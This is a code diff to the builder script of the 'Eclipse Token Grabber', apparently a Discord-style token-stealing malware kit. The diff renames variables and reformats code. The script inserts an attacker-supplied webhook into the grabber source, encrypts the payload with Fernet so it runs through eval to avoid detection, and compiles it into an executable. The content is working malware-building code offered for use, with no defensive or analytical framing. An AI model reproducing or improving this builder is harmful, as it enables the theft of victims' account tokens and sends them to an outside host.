@@ -6,7 +6,7 @@ from sys import platform as OS
 
 from cryptography.fernet import Fernet
 
-TITLE = '''
+BANNER = '''
     ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
     ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
     █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
@@ -16,13 +16,13 @@ TITLE = '''
 \n        Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
 '''
 
-ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
-
-KEY = Fernet.generate_key().decode()
+GRABBER_PATH = path.join("code", "eclipse-grabber.py")
+ENC_KEY = Fernet.generate_key().decode()
 
 
 def build(webhook: str, out_file: str, debug: bool):
-    code_file = open(ECLIPSE_GRABBER_PATH, 'r')
+
+    code_file = open(GRABBER_PATH, 'r')
     code = code_file.read()
     code_file.close()
 
@@ -30,8 +30,11 @@ def build(webhook: str, out_file: str, debug: bool):
     libs = code[0:index] + "\nimport cffi\nfrom cryptography.fernet import Fernet\n"
     content = code[index:-1].replace("{WEBHOOK}", str(webhook))
 
-    encrypted_content = Fernet(KEY).encrypt(content.encode())
-    eval_code = f"\ncode = Fernet('{KEY}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))"
+    encrypted_content = Fernet(ENC_KEY).encrypt(content.encode())
+    eval_code = (
+        f"\ncode = Fernet('{ENC_KEY}').decrypt({encrypted_content}).decode();"
+        "eval(compile(code, '<string>', 'exec'))"
+    )
 
     build_file = open(out_file + ".py", 'w')
     build_file.write(libs)
@@ -57,6 +60,7 @@ def build(webhook: str, out_file: str, debug: bool):
         else:
             command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
             result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
+
             if "completed successfully" not in result:
                 raise Exception(result)  # result.splitlines()[-2]
     except Exception as error:
@@ -70,6 +74,7 @@ def build(webhook: str, out_file: str, debug: bool):
 
 
 def get_args() -> Namespace:
+
     parser = ArgumentParser(description='Eclipse Token Grabber Builder')
     parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
     parser.add_argument('-o', '--outfile', help='name your executable', default='', required=True)
@@ -78,8 +83,9 @@ def get_args() -> Namespace:
 
 
 def main(args: Namespace):
-    print(TITLE)
-    print("[+] Encryption Key:", KEY)
+
+    print(BANNER)
+    print("[+] Encryption Key:", ENC_KEY)
     print("\n[+] Building Eclipse Token Grabber, please wait...")
     build(args.webhook, args.outfile, args.debug)
     print("\n[+] Successfully Built!",
